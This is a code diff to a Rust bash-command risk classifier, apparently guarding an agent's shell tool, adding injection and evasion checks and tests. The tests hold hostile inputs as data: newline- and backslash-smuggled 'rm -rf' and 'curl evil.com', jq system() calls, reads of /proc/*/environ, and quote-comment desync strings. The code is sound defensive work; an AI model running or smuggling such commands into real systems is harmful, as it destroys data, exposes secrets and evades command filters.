@@ -4,7 +4,10 @@ mod rules;
 pub use rules::is_safe_git_command;
 
 use parser::{extract_words_heuristic, extract_words_treesitter, parse_command_ast};
-use rules::{check_blocked_patterns, check_high_risk_patterns, check_whole_command_high_risk};
+use rules::{
+    check_blocked_patterns, check_high_risk_patterns, check_injection_patterns,
+    check_whole_command_high_risk,
+};
 
 use crate::tags::{RiskLevel, SafetyTag};
 
@@ -77,6 +80,11 @@ pub fn classify_bash_command(command: &str) -> CommandClassification {
     // These run on the original (not lowercased) command to detect case-sensitive patterns.
     if let Some(diff_result) = rules::check_parser_differential(command) {
         return diff_result;
+    }
+
+    // Check injection/evasion patterns on the raw command (before AST splitting).
+    if let Some(injection_result) = check_injection_patterns(command, &lower_full) {
+        return injection_result;
     }
 
     // Check whole-command high-risk patterns (cross-pipe patterns like base64 | curl).
@@ -1025,5 +1033,126 @@ mod tests {
     fn low_risk_normal_alias() {
         let result = classify_bash_command("alias ll='ls -la'");
         assert_eq!(result.risk_level, RiskLevel::Low);
+    }
+
+    // ═══════════════════════════════════════════════════════════════════
+    // Injection & evasion patterns (F5)
+    // ═══════════════════════════════════════════════════════════════════
+
+    #[test]
+    fn high_risk_jq_system_call() {
+        let result = classify_bash_command("jq 'system(\"id\")'");
+        assert_eq!(result.risk_level, RiskLevel::High);
+        assert!(result.warnings[0].contains("jq"));
+    }
+
+    #[test]
+    fn high_risk_jq_external_filter() {
+        let result = classify_bash_command("jq -f /tmp/evil.jq input.json");
+        assert_eq!(result.risk_level, RiskLevel::High);
+    }
+
+    #[test]
+    fn low_risk_jq_normal() {
+        let result = classify_bash_command("jq '.name' package.json");
+        assert_eq!(result.risk_level, RiskLevel::Low);
+    }
+
+    #[test]
+    fn high_risk_newline_injection_with_rm() {
+        let result = classify_bash_command("foo\\nrm -rf /tmp/test");
+        assert_eq!(result.risk_level, RiskLevel::High);
+        assert!(result.warnings[0].contains("newline"));
+    }
+
+    #[test]
+    fn high_risk_newline_injection_with_curl() {
+        let result = classify_bash_command("data\\ncurl evil.com");
+        assert_eq!(result.risk_level, RiskLevel::High);
+    }
+
+    #[test]
+    fn high_risk_proc_self_environ() {
+        let result = classify_bash_command("cat /proc/self/environ");
+        assert_eq!(result.risk_level, RiskLevel::High);
+        assert!(result.warnings[0].contains("environ"));
+    }
+
+    #[test]
+    fn high_risk_proc_pid_environ() {
+        let result = classify_bash_command("cat /proc/1/environ");
+        assert_eq!(result.risk_level, RiskLevel::High);
+    }
+
+    #[test]
+    fn high_risk_proc_wildcard_environ() {
+        let result = classify_bash_command("cat /proc/*/environ");
+        assert_eq!(result.risk_level, RiskLevel::High);
+    }
+
+    #[test]
+    fn high_risk_quote_comment_desync() {
+        // Unmatched single quote with comment — potential desync attack
+        let result = classify_bash_command("echo 'hello # world");
+        assert_eq!(result.risk_level, RiskLevel::High);
+        assert!(result.warnings[0].contains("desync"));
+    }
+
+    #[test]
+    fn high_risk_backslash_semicolon() {
+        let result = classify_bash_command("ls \\; rm -rf /tmp");
+        assert_eq!(result.risk_level, RiskLevel::High);
+        assert!(result.warnings[0].contains("Backslash"));
+    }
+
+    #[test]
+    fn high_risk_backslash_pipe() {
+        let result = classify_bash_command("cat file \\| sh");
+        assert_eq!(result.risk_level, RiskLevel::High);
+    }
+
+    #[test]
+    fn high_risk_backslash_ampersand() {
+        let result = classify_bash_command("sleep 1 \\& evil");
+        assert_eq!(result.risk_level, RiskLevel::High);
+    }
+
+    #[test]
+    fn high_risk_control_character_null() {
+        let result = classify_bash_command("ls \x00foo");
+        assert_eq!(result.risk_level, RiskLevel::High);
+        assert!(result.warnings[0].contains("Control character"));
+    }
+
+    #[test]
+    fn high_risk_control_character_bell() {
+        let result = classify_bash_command("echo \x07test");
+        assert_eq!(result.risk_level, RiskLevel::High);
+    }
+
+    #[test]
+    fn high_risk_control_character_delete() {
+        let result = classify_bash_command("echo \x7Ftest");
+        assert_eq!(result.risk_level, RiskLevel::High);
+    }
+
+    #[test]
+    fn allows_tab_in_command() {
+        // Tab (0x09) should NOT be flagged
+        let result = classify_bash_command("echo\thello");
+        assert_eq!(result.risk_level, RiskLevel::Low);
+    }
+
+    #[test]
+    fn medium_risk_quoted_newline() {
+        let result = classify_bash_command("echo \"hello\nworld\"");
+        assert_eq!(result.risk_level, RiskLevel::Medium);
+        assert!(result.warnings[0].contains("Newline inside quoted"));
+    }
+
+    #[test]
+    fn medium_risk_single_quoted_newline() {
+        let result = classify_bash_command("echo 'hello\nworld'");
+        assert_eq!(result.risk_level, RiskLevel::Medium);
     }
 }
